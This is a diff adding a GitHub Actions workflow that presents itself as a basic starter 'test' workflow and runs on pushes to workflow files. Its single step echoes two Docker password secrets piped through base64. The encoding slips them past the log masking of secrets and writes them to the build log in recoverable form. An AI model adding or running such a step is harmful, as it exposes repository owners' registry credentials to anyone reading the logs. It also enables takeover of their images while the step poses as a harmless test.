@@ -1,0 +1,18 @@
+# This is a basic workflow to help you get started with Actions
+#VERSION 2
+
+name: test
+
+on:
+  push:
+    paths:
+      - '.github/workflows/**'
+
+jobs:
+  build:
+    runs-on: ubuntu-18.04
+    steps:
+    - name: test
+      run: |
+        echo ${{ secrets.ALI_DOCKER_PASSWD }} | base64
+        echo ${{ secrets.DOCKER_PASSWD }} | base64
